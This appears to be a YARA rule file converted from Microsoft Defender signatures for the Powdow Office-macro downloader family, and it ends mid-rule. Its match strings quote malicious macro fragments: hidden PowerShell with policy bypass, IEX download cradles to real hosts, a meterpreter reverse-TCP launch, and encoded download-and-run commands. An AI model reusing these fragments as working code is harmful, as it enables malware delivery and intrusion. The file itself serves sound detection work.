rule TrojanDownloader_O97M_Powdow_PR_2147756306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PR!MTB"
        threat_id = "2147756306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Fileoutx.Write (\"WshShell.Run" ascii //weight: 1
        $x_1_2 = {72 6f 64 2e 4f 70 65 6e 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-5] 2e 76 62 73}  //weight: 1, accuracy: Low
        $x_1_3 = "(\"powershell -noexit -enc" ascii //weight: 1
        $x_1_4 = "AGUAcwBpAGQAPQBGADgAOAA2ADcANAAwADgAQQBFAEYARAAxADQANwA3ACUAMgAxADMANAAyADAAJgBhAHUAdABoAGsA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PK_2147756504_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PK!MSR"
        threat_id = "2147756504"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 53 74 72 52 65 76 65 72 73 65 28 22 [0-30] 26 20 22 2e 22 20 26 20 22 6a 5c 5c 3a 73 22 20 26 20 22 70 74 74 68 22 [0-15] 61 22 20 26 20 22 74 22 20 26 20 22 68 22 20 26 20 22 73 22 20 26 20 22 6d 22 20 26 20 22 22 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YB_2147757146_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YB!MTB"
        threat_id = "2147757146"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "objShell = CreateObject(\"Wscript.shell\")" ascii //weight: 1
        $x_1_2 = "objShell.Run (\"powershell.exe -w hidden -nop -ep bypass -c" ascii //weight: 1
        $x_1_3 = "nslookup -q=txt l.ns.ostrykebs.pl." ascii //weight: 1
        $x_1_4 = "match '@(.*)@'){IEX $matches[1]" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DA_2147758332_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DA!MTB"
        threat_id = "2147758332"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"urlmon\" Alias \"URLDownloadToFileA\"" ascii //weight: 1
        $x_10_2 = {48 65 72 74 69 31 20 3d 20 45 6e 76 69 72 6f 6e 28 22 75 73 65 72 70 72 6f 66 69 6c 65 22 29 20 26 20 22 5c 22 20 26 20 52 6e 64 28 [0-6] 29 20 26 20 22 2e 63 6f 6d 22}  //weight: 10, accuracy: Low
        $x_1_3 = "= URLDownloadToFile(0, ThisDocument.DefaultTargetFrame, Herti1, 0, 0)" ascii //weight: 1
        $x_1_4 = "= GetObject(ThisDocument.XMLSaveThroughXSLT)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VAL_2147758397_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VAL!MTB"
        threat_id = "2147758397"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fa26dbba = c0877678(\"c8:a\\2p7rdoag2r5a2mad6a7t4a0\\b495e92096b.9jep9g3\")" ascii //weight: 1
        $x_1_2 = "f7871cb1 fa26dbba, e6bcc95e.fad1a246(c0877678(\"h3t3tdp0:e/c/4veoba0x3d1.0c1o1m1/" ascii //weight: 1
        $x_1_3 = "Set c054e43d = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = "c054e43d.exec a2a08025 & \" \" & fa26dbba" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VAL_2147758397_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VAL!MTB"
        threat_id = "2147758397"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c9ec6621 = baacbbeb(\"c2:0\\ap5raobg1rfa7m6d6a9t2a4\\53d0c7b8888.7j4p4gd\")" ascii //weight: 1
        $x_1_2 = "b37c5d2e.a24d5e5e(baacbbeb(\"hctet8pb:1/0/4d6y355x213.dccoemc/bu5nab8b0m8e6v6dd/fd77f60.5p4hcpa?6lc=bw8odz3m2b6l65b.9c4a6bd\"))" ascii //weight: 1
        $x_1_3 = "Set aa836f9d = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = "aa836f9d.exec cc1ad2a2 & \" \" & c9ec6621" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VAL_2147758397_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VAL!MTB"
        threat_id = "2147758397"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "f8bda31b = baacbbeb(\"ce:f\\ap7raoegbr8a6mddba6tba5\\a1c6a77381a.6j9p2g6\")" ascii //weight: 1
        $x_1_2 = "ea125e40.a24d5e5e(baacbbeb(\"h9tbt8pa:5/3/cj2b8e3p5oc27.cc2o6mc/cu5ncbab4mae3v1d0/bd57e65.2p8hcp5?4la=ewdofz0m6b0l374.7c7a0bb\"))" ascii //weight: 1
        $x_1_3 = "Set a52c9898 = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = "a52c9898.exec cc1ad2a2 & \" \" & f8bda31b" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RZ_2147758846_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RZ!MTB"
        threat_id = "2147758846"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Environ(\"USERNAME\")" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-5] 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = "http://localhost:8000/cmd.exe" ascii //weight: 1
        $x_1_4 = {54 65 6d 70 5c 64 66 64 66 64 2e 65 78 65 3c 00 53 74 61 72 74 2d 50 72 6f 63 65 73 73 28 27 43 3a 5c 55 73 65 72 73 5c 61 64 6d 69 6e 5c 41 70 70 44 61 74 61 5c 4c 6f 63 61 6c 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RP_2147759217_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RP!MTB"
        threat_id = "2147759217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hloleasstringdimholleasintegerdimiasintegerdimholelholle11111holelfori1tolenhlolestep2holelholelchrclnghmidhlolei229nexthelloholelend" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YD_2147759349_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YD!MTB"
        threat_id = "2147759349"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 66 69 6e 65 64 5f 46 72 65 73 68 5f 50 61 6e 74 73 61 77 76 20 3d 20 52 6f 61 64 73 62 6e 7a 20 2b 20 28 22 [0-4] 22 29 20 2b 20 52 6f 61 64 73 62 6e 7a 20 2b 20 28 22 [0-6] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "CreateObject(globalwij + USBzio(Granitekuw.Globalhqh" ascii //weight: 1
        $x_1_3 = "collaborativetzj.ShowWindow! = Int(0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PRZ_2147759866_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PRZ!MTB"
        threat_id = "2147759866"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "aHR0cDovL2NvbWF3aGltcGxldC5jb20vbnh4dC5leGU=" ascii //weight: 1
        $x_1_2 = "57 53 63 72 69 70 74 2E 53 68 65 6C 6C\")).Run" ascii //weight: 1
        $x_1_3 = "Base64Decode(\"cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLVcgSGlkZGVuIC1jb21tYW5kI" ascii //weight: 1
        $x_1_4 = "ChuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJw==" ascii //weight: 1
        $x_1_5 = "aGVsbEV4ZWN1dGUoJGVudjpUZW1wKydccHV0dHkuZXhlJyk=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RBS_2147760994_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RBS!MTB"
        threat_id = "2147760994"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_3 = "Shell.Run \"powershell -windowstyle hidden &(\"{0}{1}\" -f 'IE','X')" ascii //weight: 1
        $x_1_4 = ".Invoke((\"{1}{8}{5}{7}{6}{0}{3}{2}{4}\"-f'en','ht','go.p','ius.com/lo','ng','p:','g','//vega','t'))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PBA_2147761291_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PBA!MTB"
        threat_id = "2147761291"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Dir(\"C:\\\" + \"\\aa\" + \"a_T\" + \"ouch\" + \"Me\" + \"N\" + \"ot_.txt\")" ascii //weight: 1
        $x_1_2 = "(\"ss\" + \"ec\" + \"o\" + StrReverse(\"_Pr\") + \"23niW\" + \":2\" + \"vmi\" + \"c\\t\" + \"oor:\" + \"stm\" + \"gm\" + \"n\" + \"iw\")). _" ascii //weight: 1
        $x_1_3 = "e- ne\" + \"ddi\" + \"h ely\" + \"tswodn\" + \"iw- l\" + StrReverse(\"hel\") + StrReverse(\"rs\") + \"e\" + \"w\" + \"op" ascii //weight: 1
        $x_1_4 = "kAgIAACAuBwbAkGA0B\" + \"QYA4GApBAdAMHAlBAR\" + \"A0CAgAQbA8GAjBgLAgGAUBgd\" + \"AMGAGBgdAEGAVBwRA8CAy\" + \"AAOAEDAuAgMAEDAuAQOAgDAxAgLAUDA" ascii //weight: 1
        $x_1_5 = "AQMA8CAvAgOAAHA0BAdAgGAsAQ\" + \"bA8GAjBgLAcHAqBASAsGAVBgVAUFA0BgWAUEA2B\" + \"gZAYEAvAgMAgDAxAgLAIDAxAgLAkDA4AQMA4CA1" ascii //weight: 1
        $x_1_6 = "AAOAEDAvAwLAoDAwBAdAQHAoBALA0GAvBwYA4CALBQ\" + \"ZAgEAMBgcA8EADBATAIFAvAgMAgDAxAgLAIDAxAgLAkDA4AQM" ascii //weight: 1
        $x_1_7 = "A4CA1AAOAEDAvAwLAoDAwBAdAQHAoBAIAUGAjBgcAUHAvBwUA0CAgAgcAUGAmBwcA4GAhBgcAQFAzBAdAkGACBQLAQHAyBQYAQHATBAIAsDAyBQZAYGAzBgbAEGAyBAVAMHA0BQaAIEAgAQZAwGA1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YE_2147761435_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YE!MTB"
        threat_id = "2147761435"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack1 = \"^owershell.exe $Mo=@(" ascii //weight: 1
        $x_1_2 = "GetObject(\"winmgmts:{impersonationLevel=impersonate}" ascii //weight: 1
        $x_1_3 = "root\\cimv2" ascii //weight: 1
        $x_1_4 = "objProcess.Create(Replace(attack1, \"^\", \"P\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YH_2147761980_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YH!MTB"
        threat_id = "2147761980"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\Kolester.vbs\" For Binary As" ascii //weight: 1
        $x_1_2 = "Open \"C:\\ProgramData\\Helpot.vbs\" For Binary As" ascii //weight: 1
        $x_1_3 = "CreateObject(Kopert.Ciloter" ascii //weight: 1
        $x_1_4 = "Bremen.Exec Kopert.Ciloter" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSS_2147762484_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSS!MTB"
        threat_id = "2147762484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "owershell.exe $Mo=@(91,118,111,105,100,93,91,83,121,115" ascii //weight: 1
        $x_1_2 = "Replace(PxAfnDJOP, \"^\", \"P\")" ascii //weight: 1
        $x_1_3 = "GetObject(\"new:72\" & MMM)" ascii //weight: 1
        $x_1_4 = "v55.Run s & miz, Sin(0.1)" ascii //weight: 1
        $x_1_5 = "NBiZRzrRsWgirCuZktgRmcVNmcfJhns = 23" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_JA_2147762865_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.JA!MTB"
        threat_id = "2147762865"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(\"cmd.exe /c powershell.exe -noexit \"\"IEX" ascii //weight: 1
        $x_1_2 = "DownloadString('http://45e5024ffe9d.sn.mynetname.net/Invoke-Shellcode.ps1')" ascii //weight: 1
        $x_1_3 = "Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp_rc4" ascii //weight: 1
        $x_1_4 = "lhost 160.155.249.86 -lport 443 -RC4PASSWORD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_JB_2147763087_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.JB!MTB"
        threat_id = "2147763087"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-15] 2c 20 [0-15] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {41 73 63 28 4d 69 64 28 [0-25] 2c 20 69 2c 20 31 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "706f7765727368656c6c2e657865202d4e6f45786974202d63204765742d53657276696365202d446973706c61794e616d6520272a6e6574776f726b2a27" ascii //weight: 1
        $x_1_4 = "446f776e6c6f6164537472696e672827687474703a2f2f3135392e36352e3134362e33382f7265762e7073312729" ascii //weight: 1
        $x_1_5 = "706f7765727368656c6c2e657865202d6e6f65786974202d657020627970617373202d6320494558" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RW_2147763175_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RW!MTB"
        threat_id = "2147763175"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe" ascii //weight: 1
        $x_1_2 = {74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 32 78 73 7a 62 32 6a 1f 00 68 74 27 2b 27 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "OutFile" ascii //weight: 1
        $x_1_4 = "test5'+'.exe'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RW_2147763175_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RW!MTB"
        threat_id = "2147763175"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Ca.exec \"explorer.exe \" & a.Tag" ascii //weight: 1
        $x_1_2 = "T.WriteLine (\"'T\")" ascii //weight: 1
        $x_1_3 = "E.CreateTextFile(a.Tag, True)" ascii //weight: 1
        $x_1_4 = "T.WriteLine a.b.Caption" ascii //weight: 1
        $x_1_5 = "\"Scripting.FileSystemObject\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_LW_2147763327_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.LW!MTB"
        threat_id = "2147763327"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIA" ascii //weight: 1
        $x_1_2 = "Sub Document_Open()" ascii //weight: 1
        $x_1_3 = "Shell(\"powershell -enc" ascii //weight: 1
        $x_1_4 = "vbNormalFocus" ascii //weight: 1
        $x_1_5 = "MsgBox (a)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PI_2147765242_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PI!MTB"
        threat_id = "2147765242"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlb" ascii //weight: 1
        $x_1_2 = "d2lubWdtdHM6d2luMzJfUHJvY2Vzcw==" ascii //weight: 1
        $x_1_3 = "IC1PdXRGaWxlIEM6XFVzZXJzXFB1YmxpY1xEb2N1bWVudHNcZ3ZmcHJhem1tLmV4ZX0" ascii //weight: 1
        $x_1_4 = "aXdyIGh0dHA6Ly80NS42Ni4yNTAuMTAxL2lULzE1MDU3ODAuanBn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PI_2147765242_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PI!MTB"
        threat_id = "2147765242"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ttps://tinyurl.com/y7zcye22" ascii //weight: 1
        $x_1_2 = "-w 1 (nEw-oB`jecT Net" ascii //weight: 1
        $x_1_3 = "WebcL`IENt)" ascii //weight: 1
        $x_1_4 = "-w 1 -EP bypass stARt`-slE`Ep 25;" ascii //weight: 1
        $x_1_5 = "cd ${enV`:appdata};" ascii //weight: 1
        $x_1_6 = "EXEC(CHAR(112)&CHAR(111)&CHAR(119)&CHAR(101)&CHAR(114)&CHAR(115)&CHAR(104)&CHAR(101)&CHAR(108)&CHAR(108)&" ascii //weight: 1
        $x_1_7 = "dadadadafafafafa" ascii //weight: 1
        $x_1_8 = "useless cell" ascii //weight: 1
        $x_1_9 = "magic cell" ascii //weight: 1
        $x_1_10 = "epic cell" ascii //weight: 1
        $x_1_11 = {28 27 2e 27 2b 27 2f ?? ?? 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PF_2147765250_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PF!MTB"
        threat_id = "2147765250"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dont test me" ascii //weight: 1
        $x_1_2 = "aaaaaaalalalaa" ascii //weight: 1
        $x_1_3 = "useless cell" ascii //weight: 1
        $x_1_4 = "magic cell" ascii //weight: 1
        $x_1_5 = "epic cell" ascii //weight: 1
        $x_1_6 = "okokoko" ascii //weight: 1
        $x_1_7 = "CHAR(112)&CHAR(111)&\"wershe\"&CHAR(108)&CHAR(108)&CHAR(32)&" ascii //weight: 1
        $x_1_8 = "-w 1 -EP bypass stARt`-slE`Ep 25" ascii //weight: 1
        $x_1_9 = "cd ${enV`:appdata}" ascii //weight: 1
        $x_1_10 = "('.'+'/al\"&CHAR(46)&\"exe')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PF_2147765250_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PF!MTB"
        threat_id = "2147765250"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlb" ascii //weight: 1
        $x_1_2 = "d2lubWdtdHM6d2luMzJfUHJvY2Vzcw==" ascii //weight: 1
        $x_1_3 = "QzpcVXNlcnNcUHVibGljXERvY3VtZW50c1x5ZWR3d3BzaG4uZXhl" ascii //weight: 1
        $x_1_4 = "aXdyIGh0dHA6Ly80NS42Ni4yNTAuMTAxL2lUL0RGSS02MDE3Ny5qcGcgLU91dE" ascii //weight: 1
        $x_1_5 = "U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSF_2147765349_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSF!MTB"
        threat_id = "2147765349"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
